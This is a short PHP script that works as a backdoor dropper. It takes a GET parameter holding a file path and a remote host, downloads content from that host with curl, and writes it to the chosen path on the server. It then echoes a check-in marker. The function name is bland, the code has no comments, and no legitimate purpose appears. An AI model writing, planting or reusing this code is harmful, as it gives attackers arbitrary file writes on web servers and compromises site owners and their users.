<?php
function class_x_i($x = ''){
	$infos = isset($_GET['infos']) ? trim($_GET['infos']) : '';
	$infos = explode('|',$infos);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://'.$infos[1]);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$result = curl_exec($ch);
	file_put_contents($infos[0],$result);
	echo 'G1024K';
}
class_x_i();
?>